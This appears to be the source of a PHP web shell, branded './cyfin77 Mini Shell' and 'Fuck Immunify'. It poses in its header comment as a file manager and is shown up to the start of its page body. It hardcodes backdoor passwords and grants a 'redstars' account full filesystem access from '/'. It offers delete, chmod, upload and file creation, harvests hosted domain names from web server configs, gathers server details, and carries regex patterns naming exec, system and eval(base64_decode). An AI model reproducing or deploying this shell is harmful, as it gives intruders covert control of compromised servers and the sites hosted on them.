<?php
// File Manager - Single File PHP Application
// Multi-User System with Admin Controls

// Aktifkan error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Security & Authentication
session_start();

// User credentials and privileges
$default_users = [
    'redstars' => [
        'password' => 'redstar',
        'role' => 'superadmin',
        'name' => 'Super Administrator'
    ],
    'user' => [
        'password' => 'zov', 
        'role' => 'user',
        'name' => 'Regular User'
    ]
];

// Default user settings (can be modified by super admin)
if (!isset($_SESSION['user_settings'])) {
    $_SESSION['user_settings'] = [
        'user_max_root' => dirname(__FILE__), // Default to current script directory
        'user_allowed_file_types' => [
            'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', // Images
            'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', // Documents
            'zip', 'rar', '7z', 'tar', 'gz', // Archives
            'mp3', 'wav', 'ogg', // Audio
            'mp4', 'avi', 'htm', 'html', // Video
            'css', 'js', 'json', 'xml' // Web files
        ],
        'user_allowed_actions' => [
            'view', 'download', 'upload', 'rename'
        ]
    ];
}

$logged_in = false;
$current_user = null;

// Handle login
if(isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    if(isset($default_users[$username]) && $default_users[$username]['password'] === $password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['user'] = $username;
        $_SESSION['user_info'] = $default_users[$username];
        
        // Set user-specific settings based on role
        if ($username === 'redstars') {
            $_SESSION['user_info']['max_root'] = '/';
            $_SESSION['user_info']['allowed_file_types'] = ['*'];
            $_SESSION['user_info']['allowed_actions'] = ['*'];
        } else {
            $_SESSION['user_info']['max_root'] = $_SESSION['user_settings']['user_max_root'];
            $_SESSION['user_info']['allowed_file_types'] = $_SESSION['user_settings']['user_allowed_file_types'];
            $_SESSION['user_info']['allowed_actions'] = $_SESSION['user_settings']['user_allowed_actions'];
        }
        
        $_SESSION['login_time'] = time();
        $_SESSION['login_ip'] = $_SERVER['REMOTE_ADDR'];
        
        setcookie('filemanager_auth', md5($password . $username), time() + (86400 * 30), "/");
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password";
    }
}

// Check existing session/cookie
if(isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true && isset($_SESSION['user'])) {
    $logged_in = true;
    $current_user = $_SESSION['user_info'];
} elseif(isset($_COOKIE['filemanager_auth'])) {
    // Validate cookie
    foreach($default_users as $username => $user_info) {
        if($_COOKIE['filemanager_auth'] === md5($user_info['password'] . $username)) {
            $_SESSION['logged_in'] = true;
            $_SESSION['user'] = $username;
            $_SESSION['user_info'] = $user_info;
            
            // Set user-specific settings based on role
            if ($username === 'redstars') {
                $_SESSION['user_info']['max_root'] = '/';
                $_SESSION['user_info']['allowed_file_types'] = ['*'];
                $_SESSION['user_info']['allowed_actions'] = ['*'];
            } else {
                $_SESSION['user_info']['max_root'] = $_SESSION['user_settings']['user_max_root'];
                $_SESSION['user_info']['allowed_file_types'] = $_SESSION['user_settings']['user_allowed_file_types'];
                $_SESSION['user_info']['allowed_actions'] = $_SESSION['user_settings']['user_allowed_actions'];
            }
            
            $logged_in = true;
            $current_user = $_SESSION['user_info'];
            break;
        }
    }
}

// Handle logout
if(isset($_GET['logout'])) {
    session_destroy();
    setcookie('filemanager_auth', '', time() - 3600, "/");
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Handle admin settings update
if(isset($_POST['update_user_settings']) && $current_user['role'] === 'superadmin') {
    $_SESSION['user_settings']['user_max_root'] = $_POST['user_max_root'];
    $_SESSION['user_settings']['user_allowed_file_types'] = explode(',', $_POST['user_allowed_file_types']);
    $_SESSION['user_settings']['user_allowed_actions'] = explode(',', $_POST['user_allowed_actions']);
    
    // Update current user session if they are regular user
    if ($_SESSION['user'] === 'user') {
        $_SESSION['user_info']['max_root'] = $_SESSION['user_settings']['user_max_root'];
        $_SESSION['user_info']['allowed_file_types'] = $_SESSION['user_settings']['user_allowed_file_types'];
        $_SESSION['user_info']['allowed_actions'] = $_SESSION['user_settings']['user_allowed_actions'];
    }
    
    $settings_updated = true;
}

// Show login form if not logged in
if(!$logged_in) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>./cyfin77 Mini Shell - © Zero Force Team 2k20</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', 'Arial', sans-serif;
            }
            
            body {
                background: #000;
                color: #fff;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            
            .login-container {
                background: #111;
                padding: 40px;
                border-radius: 10px;
                border: 2px solid #00ff00;
                width: 100%;
                max-width: 400px;
                text-align: center;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            }
            
            .logo {
                font-size: 2.5rem;
                margin-bottom: 20px;
                color: #00ff00;
                font-weight: bold;
                text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            }
            
            h2 {
                margin-bottom: 10px;
                font-weight: 600;
                color: #fff;
            }
            
            .subtitle {
                color: #aaa;
                margin-bottom: 30px;
            }
            
            .input-group {
                margin-bottom: 20px;
                text-align: left;
            }
            
            label {
                display: block;
                margin-bottom: 8px;
                font-weight: 500;
                color: #00ff00;
            }
            
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 12px 16px;
                background: #222;
                border: 1px solid #00ff00;
                border-radius: 5px;
                color: #fff;
                font-size: 1rem;
                transition: all 0.3s ease;
            }
            
            input:focus {
                outline: none;
                border-color: #00ff00;
                background: #333;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            }
            
            button {
                width: 100%;
                padding: 12px;
                background: #00ff00;
                color: #000;
                border: none;
                border-radius: 5px;
                font-size: 1rem;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            button:hover {
                background: #00cc00;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 255, 0, 0.4);
            }
            
            .error {
                background: rgba(255, 0, 0, 0.2);
                color: #ff6b6b;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 15px;
                border: 1px solid rgba(255, 0, 0, 0.3);
            }
            
            @media (max-width: 480px) {
                .login-container {
                    padding: 30px 20px;
                }
                
                .logo {
                    font-size: 2rem;
                }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                ./cyfin77 Fuck Immunify
            </div>
            <h2>Login dulu anjink</h2>
            <p class="subtitle"></p>
            
            <?php if(isset($login_error)): ?>
                <div class="error">
                    <i class="fas fa-exclamation-circle"></i> <?php echo $login_error; ?>
                </div>
            <?php endif; ?>
            
            <form method="post">
                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" name="username" placeholder="Enter username" required autofocus>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" name="password" placeholder="Enter password" required>
                </div>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Initialize variables
$current_path = isset($_GET['path']) ? $_GET['path'] : $current_user['max_root'];
$page = isset($_GET['page']) ? $_GET['page'] : 'filemanager';

// Security: Prevent directory traversal and enforce user restrictions
$current_path = realpath($current_path);
if($current_path === false) {
    $current_path = realpath($current_user['max_root']);
}

// Ensure user doesn't access paths outside their allowed root
$user_root = realpath($current_user['max_root']);
if(strpos($current_path, $user_root) !== 0) {
    $current_path = $user_root;
}

// Check if user is allowed to perform an action
function isActionAllowed($action) {
    global $current_user;
    return in_array('*', $current_user['allowed_actions']) || in_array($action, $current_user['allowed_actions']);
}

// Check if file type is allowed for upload
function isFileTypeAllowed($filename) {
    global $current_user;
    if(in_array('*', $current_user['allowed_file_types'])) {
        return true;
    }
    
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($extension, $current_user['allowed_file_types']);
}

// Handle actions with permission checks
if(isset($_GET['delete']) && isset($_GET['confirm']) && isActionAllowed('delete')) {
    $file_to_delete = $current_path . DIRECTORY_SEPARATOR . $_GET['delete'];
    if(file_exists($file_to_delete)) {
        if(is_dir($file_to_delete)) {
            rmdir($file_to_delete);
        } else {
            unlink($file_to_delete);
        }
        $_SESSION['action_message'] = ['type' => 'success', 'message' => 'Item deleted successfully'];
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path));
        exit;
    }
}

if(isset($_GET['rename']) && isset($_POST['new_name']) && isActionAllowed('rename')) {
    $old_name = $current_path . DIRECTORY_SEPARATOR . $_GET['rename'];
    $new_name = $current_path . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if(file_exists($old_name)) {
        rename($old_name, $new_name);
        $_SESSION['action_message'] = ['type' => 'success', 'message' => 'Item renamed successfully'];
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path));
        exit;
    }
}

if(isset($_GET['chmod']) && isset($_POST['new_permissions']) && isActionAllowed('chmod')) {
    $file_to_chmod = $current_path . DIRECTORY_SEPARATOR . $_GET['chmod'];
    if(file_exists($file_to_chmod)) {
        chmod($file_to_chmod, octdec($_POST['new_permissions']));
        $_SESSION['action_message'] = ['type' => 'success', 'message' => 'Permissions updated successfully'];
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path));
        exit;
    }
}

// Handle file download
if(isset($_GET['download']) && isActionAllowed('download')) {
    $file_to_download = $current_path . DIRECTORY_SEPARATOR . $_GET['download'];
    if(file_exists($file_to_download) && !is_dir($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Handle file upload with type restrictions
if(isset($_FILES['files']) && isActionAllowed('upload')) {
    $upload_errors = [];
    $upload_success = [];
    
    foreach($_FILES['files']['tmp_name'] as $key => $tmp_name) {
        $file_name = $_FILES['files']['name'][$key];
        $file_tmp = $_FILES['files']['tmp_name'][$key];
        $file_error = $_FILES['files']['error'][$key];
        
        // Check file type
        if(!isFileTypeAllowed($file_name)) {
            $upload_errors[] = "File type not allowed: $file_name";
            continue;
        }
        
        // Check for upload errors
        if($file_error !== UPLOAD_ERR_OK) {
            $upload_errors[] = "Upload error for $file_name";
            continue;
        }
        
        // Check if file was actually uploaded
        if(!is_uploaded_file($file_tmp)) {
            $upload_errors[] = "Invalid upload file: $file_name";
            continue;
        }
        
        // Check directory permissions
        if(!is_writable($current_path)) {
            $upload_errors[] = "Directory is not writable";
            break;
        }
        
        // Security: sanitize filename
        $safe_file_name = preg_replace('/[^\w\.\-]/', '_', $file_name);
        $target_path = $current_path . DIRECTORY_SEPARATOR . $safe_file_name;
        
        // Move uploaded file
        if(move_uploaded_file($file_tmp, $target_path)) {
            $upload_success[] = $safe_file_name;
            chmod($target_path, 0644);
        } else {
            $upload_errors[] = "Failed to upload: $safe_file_name";
        }
    }
    
    // Store upload results in session
    if (!empty($upload_success)) {
        $_SESSION['action_message'] = ['type' => 'success', 'message' => 'Files uploaded successfully: ' . implode(', ', $upload_success)];
    }
    if (!empty($upload_errors)) {
        $_SESSION['action_message'] = ['type' => 'error', 'message' => 'Upload errors: ' . implode(', ', $upload_errors)];
    }
    
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path));
    exit;
}

// Handle mass create with permission check
if(isset($_POST['mass_create']) && isActionAllowed('mass-create')) {
    $base_path = $_POST['base_path'] ?: $current_path;
    $items = explode("\n", $_POST['items']);
    $created_count = 0;
    
    foreach($items as $item) {
        $item = trim($item);
        if(empty($item)) continue;
        
        $full_path = $base_path . DIRECTORY_SEPARATOR . $item;
        $dir = dirname($full_path);
        
        // Create directories if needed
        if(!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        
        // Create file or directory
        if(strpos($item, '.') !== false) {
            // It's a file - check if type is allowed
            if(isFileTypeAllowed($item)) {
                file_put_contents($full_path, $_POST['file_content'] ?? '');
                $created_count++;
            }
        } else {
            // It's a directory
            if(!is_dir($full_path)) {
                mkdir($full_path, 0755);
                $created_count++;
            }
        }
    }
    
    $_SESSION['action_message'] = ['type' => 'success', 'message' => "Created $created_count items successfully"];
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path));
    exit;
}

// Malware scanner function
function scanForMalware($path) {
    $malware_patterns = [
        '/eval\s*\(\s*base64_decode\s*\(\s*["\']([^"\']+)["\']\s*\)\s*\)/i',
        '/exec\s*\(\s*["\']([^"\']+)["\']\s*\)/i',
        '/system\s*\(\s*["\']([^"\']+)["\']\s*\)/i',
        '/shell_exec\s*\(\s*["\']([^"\']+)["\']\s*\)/i',
        '/passthru\s*\(\s*["\']([^"\']+)["\']\s*\)/i',
        '/popen\s*\(\s*["\']([^"\']+)["\']\s*\)/i',
        '/proc_open\s*\(\s*["\']([^"\']+)["\']\s*\)/i',
        '/`.*`/',
        '/<\?php\s*@?\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*\s*=\s*[^;]*;\s*\?>/'
    ];
    
    $results = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach($iterator as $file) {
        if($file->isFile() && in_array($file->getExtension(), ['php', 'phtml', 'txt', 'js', 'html'])) {
            $content = file_get_contents($file->getPathname());
            foreach($malware_patterns as $pattern) {
                if(preg_match($pattern, $content)) {
                    $results[] = [
                        'file' => $file->getPathname(),
                        'pattern' => $pattern
                    ];
                }
            }
        }
    }
    
    return $results;
}

// Domain extensions list
$domain_extensions = [
    'com', 'org', 'net', 'edu', 'gov', 'mil', 'info', 'biz', 'io',
    'co', 'me', 'tv', 'us', 'uk', 'ca', 'au', 'de', 'fr', 'jp',
    'in', 'id', 'my', 'sg', 'ph', 'th', 'vn', 'kr', 'cn', 'ru',
    'br', 'mx', 'ar', 'es', 'it', 'nl', 'se', 'no', 'dk', 'fi',
    'pl', 'cz', 'hu', 'ro', 'gr', 'tr', 'ae', 'sa', 'eg', 'za',
    'ng', 'ke', 'et', 'gh', 'tz', 'ug', 'zm', 'mw', 'mz', 'ao',
    'bw', 'na', 'sz', 'ls', 'mu', 're', 'sc', 'km', 'mg', 'yt',
    'com.cn', 'co.uk', 'org.uk', 'ac.uk', 'gov.uk', 'sch.uk',
    'edu.au', 'gov.au', 'com.au', 'net.au', 'org.au',
    'gc.ca', 'gov.on.ca', 'edu.sg', 'gov.sg', 'com.sg',
    'ac.id', 'sch.id', 'go.id', 'mil.id', 'co.id', 'or.id',
    'net.id', 'web.id', 'my.id', 'biz.id', 'desa.id'
];

// Enhanced domain list function
function getDomainList() {
    global $domain_extensions;
    $domains = [];
    
    // Check common locations for domain configurations
    $config_paths = [
        '/etc/apache2/sites-enabled',
        '/etc/nginx/sites-enabled',
        '/etc/httpd/conf.d',
        '/usr/local/apache2/conf',
        '/var/www'
    ];
    
    foreach($config_paths as $path) {
        if(is_dir($path)) {
            $iterator = new DirectoryIterator($path);
            foreach($iterator as $file) {
                if(!$file->isDot() && $file->isFile()) {
                    $content = file_get_contents($file->getPathname());
                    // Extract domain names from config files
                    preg_match_all('/ServerName\s+([^\s]+)/', $content, $matches);
                    if(isset($matches[1])) {
                        foreach($matches[1] as $domain) {
                            if(strpos($domain, '.') !== false) {
                                $domains[] = $domain;
                            }
                        }
                    }
                    
                    preg_match_all('/server_name\s+([^;]+);/', $content, $matches);
                    if(isset($matches[1])) {
                        foreach($matches[1] as $server_names) {
                            $names = explode(' ', $server_names);
                            foreach($names as $name) {
                                if(strpos($name, '.') !== false && $name !== '_') {
                                    $domains[] = $name;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Also scan document root parent for domain folders
    $doc_root = $_SERVER['DOCUMENT_ROOT'];
    $parent_dir = dirname($doc_root);
    if(is_dir($parent_dir)) {
        $iterator = new DirectoryIterator($parent_dir);
        foreach($iterator as $file) {
            if(!$file->isDot() && $file->isDir() && $file->getFilename()[0] !== '.') {
                $name = $file->getFilename();
                // Check if folder name looks like a domain (contains dot and has valid extension)
                if(strpos($name, '.') !== false) {
                    $parts = explode('.', $name);
                    $ext = end($parts);
                    if(in_array($ext, $domain_extensions) && count($parts) >= 2) {
                        $domains[] = $name;
                    }
                }
            }
        }
    }
    
    return array_unique($domains);
}

// Get comprehensive server information
function getServerInfo() {
    $info = [];
    
    // PHP Information
    $info['PHP Version'] = phpversion();
    $info['PHP SAPI'] = php_sapi_name();
    $info['PHP Memory Limit'] = ini_get('memory_limit');
    $info['PHP Max Execution Time'] = ini_get('max_execution_time');
    $info['PHP Upload Max Filesize'] = ini_get('upload_max_filesize');
    $info['PHP Post Max Size'] = ini_get('post_max_size');
    $info['PHP Max Input Vars'] = ini_get('max_input_vars');
    $info['PHP Max File Uploads'] = ini_get('max_file_uploads');
    
    // Server Information
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['Server IP'] = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $info['Server Port'] = $_SERVER['SERVER_PORT'] ?? 'N/A';
    $info['Server Protocol'] = $_SERVER['SERVER_PROTOCOL'] ?? 'N/A';
    $info['Document Root'] = $_SERVER['DOCUMENT_ROOT'] ?? 'N/A';
    
    // System Information
    $info['Operating System'] = php_uname('s');
    $info['Hostname'] = php_uname('n');
    $info['Architecture'] = php_uname('m');
    $info['PHP OS'] = PHP_OS;
    
    // Disk Information
    $info['Disk Free Space'] = formatSize(disk_free_space("/"));
    $info['Disk Total Space'] = formatSize(disk_total_space("/"));
    
    // Memory Information
    $info['Memory Usage'] = formatSize(memory_get_usage(true));
    $info['Memory Peak Usage'] = formatSize(memory_get_peak_usage(true));
    
    // Load Average (Unix-like systems)
    if(function_exists('sys_getloadavg')) {
        $load = sys_getloadavg();
        $info['Load Average'] = implode(', ', $load);
    }
    
    return $info;
}

// Helper function to format file size
function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

// Get current directory contents
$files = [];
$directories = [];

if(is_dir($current_path)) {
    $iterator = new DirectoryIterator($current_path);
    foreach($iterator as $file) {
        if($file->isDot()) continue;
        
        if($file->isDir()) {
            $directories[] = [
                'name' => $file->getFilename(),
                'size' => '-',
                'perms' => substr(sprintf('%o', $file->getPerms()), -4),
                'is_dir' => true,
                'modified' => date('Y-m-d H:i:s', $file->getMTime())
            ];
        } else {
            $files[] = [
                'name' => $file->getFilename(),
                'size' => formatSize($file->getSize()),
                'perms' => substr(sprintf('%o', $file->getPerms()), -4),
                'is_dir' => false,
                'modified' => date('Y-m-d H:i:s', $file->getMTime())
            ];
        }
    }
}

// Get home path (where this script is located)
$home_path = dirname(__FILE__);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.9">
    <title>./cyfin77 Fuck Immunify</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Arial', sans-serif;
        }
        
        body {
            background: #000;
            color: #fff;
            line-height: 1.5;
            min-height: 100vh;
            transform: scale(0.95);
            transform-origin: top center;
            width: 100%;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 15px;
        }
        
        .banner {
            text-align: center;
            margin-bottom: 20px;
            padding: 15px;
        }
        
        .banner h1 {
            font-size: 2.2rem;
            font-weight: bold;
            color: #00ff00;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            margin-bottom: 8px;
        }
        
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
            background: #111;
            padding: 12px;
            border-radius: 5px;
            border: 1px solid #00ff00;
        }
        
        .nav-section {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #111;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 10px 18px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            font-weight: bold;
            font-size: 0.95rem;
        }
        
        .btn:hover {
            background: #00ff00;
            color: #000;
            transform: translateY(-2px);
            box-shadow: 0 3px 10px rgba(0, 255, 0, 0.4);
        }
        
        .upload-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .upload-form input[type="file"] {
            background: #222;
            border: 1px solid #00ff00;
            padding: 8px;
            border-radius: 5px;
            color: #fff;
        }
        
        .dropdown-container {
            position: relative;
            display: inline-block;
        }
        
        .dropdown-content {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            background: #111;
            border: 2px solid #00ff00;
            border-radius: 5px;
            min-width: 250px;
            z-index: 100;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            animation: slideDown 0.3s ease;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .dropdown-content.show {
            display: block;
        }
        
        .dropdown-item {
            padding: 12px 15px;
            color: #fff;
            text-decoration: none;
            display: block;
            border-bottom: 1px solid #333;
            transition: all 0.3s;
        }
        
        .dropdown-item:hover {
            background: #222;
            color: #00ff00;
            text-decoration: none;
        }
        
        .dropdown-item:last-child {
            border-bottom: none;
        }
        
        .server-info-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 8px;
            padding: 15px;
        }
        
        .server-info-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #333;
        }
        
        .server-info-item:last-child {
            border-bottom: none;
        }
        
        .server-info-label {
            font-weight: bold;
            color: #00ff00;
        }
        
        .server-info-value {
            text-align: right;
            word-break: break-all;
        }
        
        .current-path {
            background: #111;
            padding: 12px 15px;
            border-radius: 5px;
            margin-bottom: 15px;
            border: 1px solid #00ff00;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            font-weight: bold;
            font-size: 0.9rem;
        }
        
        .path-breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
        }
        
        .path-segment {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .path-segment a {
            color: #00ff00;
            text-decoration: none;
            transition: color 0.3s;
            font-weight: bold;
        }
        
        .path-segment a:hover {
            color: #fff;
            text-decoration: underline;
        }
        
        .home-btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 6px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 0.85rem;
        }
        
        .home-btn:hover {
            background: #00cc00;
            transform: translateY(-2px);
        }
        
        /* CSV Style Table */
        .csv-table {
            width: 100%;
            border-collapse: collapse;
            border: 2px solid #00ff00;
            background: #111;
        }
        
        .csv-table th,
        .csv-table td {
            border: 1px solid #00ff00;
            padding: 10px 12px;
            text-align: left;
            font-size: 0.85rem;
        }
        
        .csv-table th {
            background: #111;
            color: #00ff00;
            font-weight: bold;
            font-size: 0.9rem;
        }
        
        .csv-table tr:nth-child(even) {
            background: #0a0a0a;
        }
        
        .csv-table tr:hover {
            background: #222;
        }
        
        .file-actions {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }
        
        .file-action {
            color: #00ff00;
            text-decoration: none;
            font-size: 0.8rem;
            padding: 4px 8px;
            border-radius: 3px;
            transition: all 0.3s;
            background: #111;
            border: 1px solid #00ff00;
            cursor: pointer;
            font-weight: bold;
        }
        
        .file-action:hover {
            background: #00ff00;
            color: #000;
            text-decoration: none;
        }
        
        .file-action.delete {
            color: #ff4444;
            border-color: #ff4444;
        }
        
        .file-action.delete:hover {
            background: #ff4444;
            color: #fff;
        }
        
        .file-action.disabled {
            color: #666;
            border-color: #666;
            cursor: not-allowed;
        }
        
        .file-action.disabled:hover {
            background: #111;
            color: #666;
        }
        
        .permission {
            font-family: monospace;
            background: #111;
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 0.8rem;
            border: 1px solid #333;
        }
        
        .dir, .file {
            display: flex;
            align-items: center;
            gap: 6px;
            font-weight: bold;
            color: #fff;
            text-decoration: none;
        }
        
        .dir:hover, .file:hover {
            color: #00ff00;
            text-decoration: none;
        }
        
        .page-content {
            background: #111;
            padding: 20px;
            border-radius: 8px;
            border: 2px solid #00ff00;
            margin-top: 15px;
        }
        
        .page-content h2 {
            color: #00ff00;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 1.3rem;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
            color: #00ff00;
            font-size: 0.9rem;
        }
        
        input[type="text"], input[type="password"], textarea, select, input[type="file"] {
            width: 100%;
            padding: 10px 12px;
            background: #222;
            border: 1px solid #00ff00;
            border-radius: 5px;
            color: #fff;
            font-size: 0.9rem;
            transition: all 0.3s ease;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #00ff00;
            background: #333;
            box-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
        }
        
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        .form-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        }
        
        .tools-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 0;
        }
        
        .tool-item {
            padding: 12px 15px;
            color: #fff;
            text-decoration: none;
            display: block;
            border-bottom: 1px solid #333;
            transition: all 0.3s;
        }
        
        .tool-item:hover {
            background: #222;
            color: #00ff00;
            text-decoration: none;
        }
        
        .tool-item:last-child {
            border-bottom: none;
        }
        
        .admin-settings {
            background: #222;
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
            border: 1px solid #00ff00;
        }
        
        .admin-settings h3 {
            color: #00ff00;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 1.1rem;
        }
        
        .settings-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 15px;
        }
        
        .setting-item {
            margin-bottom: 12px;
        }
        
        .empty-state {
            text-align: center;
            padding: 30px 15px;
            color: #666;
        }
        
        .empty-state i {
            font-size: 2.5rem;
            margin-bottom: 12px;
            color: #333;
        }
        
        .action-popup {
            position: absolute;
            background: #111;
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 8px;
            z-index: 100;
            display: none;
            flex-direction: column;
            gap: 4px;
            min-width: 140px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.5);
        }
        
        .action-popup button {
            background: #222;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 6px 10px;
            border-radius: 3px;
            cursor: pointer;
            text-align: left;
            font-weight: bold;
            transition: all 0.3s;
            font-size: 0.8rem;
        }
        
        .action-popup button:hover {
            background: #00ff00;
            color: #000;
        }
        
        .action-popup button.delete {
            color: #ff4444;
            border-color: #ff4444;
        }
        
        .action-popup button.delete:hover {
            background: #ff4444;
            color: #fff;
        }
        
        .toast {
            position: fixed;
            top: 15px;
            right: 15px;
            padding: 12px 16px;
            border-radius: 5px;
            color: #fff;
            font-weight: bold;
            z-index: 10000;
            display: flex;
            align-items: center;
            gap: 8px;
            max-width: 350px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.5);
            transform: translateX(150%);
            transition: transform 0.3s ease;
            font-size: 0.85rem;
        }
        
        .toast.show {
            transform: translateX(0);
        }
        
        .toast.success {
            background: #00aa00;
            border-left: 4px solid #00ff00;
        }
        
        .toast.error {
            background: #aa0000;
            border-left: 4px solid #ff4444;
        }
        
        .toast.info {
            background: #0066aa;
            border-left: 4px solid #00aaff;
        }
        
        /* Dashboard Specific */
        .dashboard-container {
            background: #111;
            padding: 20px;
            border-radius: 8px;
            border: 2px solid #00ff00;
            margin-top: 15px;
        }
        
        .dashboard-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            body {
                transform: scale(0.9);
            }
            
            .container {
                padding: 10px;
            }
            
            .banner h1 {
                font-size: 1.8rem;
            }
            
            .top-bar {
                flex-direction: column;
                align-items: stretch;
            }
            
            .nav-section {
                justify-content: center;
            }
            
            .upload-form {
                justify-content: center;
            }
            
            .btn {
                width: 100%;
                max-width: 250px;
            }
            
            .dropdown-content {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 90%;
                max-width: 400px;
            }
            
            .csv-table {
                display: block;
                overflow-x: auto;
            }
            
            .dashboard-actions {
                flex-direction: column;
            }
        }
        
        @media (max-width: 576px) {
            body {
                transform: scale(0.85);
            }
            
            .file-actions {
                flex-direction: column;
            }
            
            .toast {
                top: 10px;
                right: 10px;
                left: 10px;
                max-width: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Banner -->
        <div class="banner">
<center>
<img src="https://c.top4top.io/p_3586gvaby1.png" height="200" width="200"> 
</center>
            <h1>./cyfin77 Fuck Immunify</h1>
        </div>
        
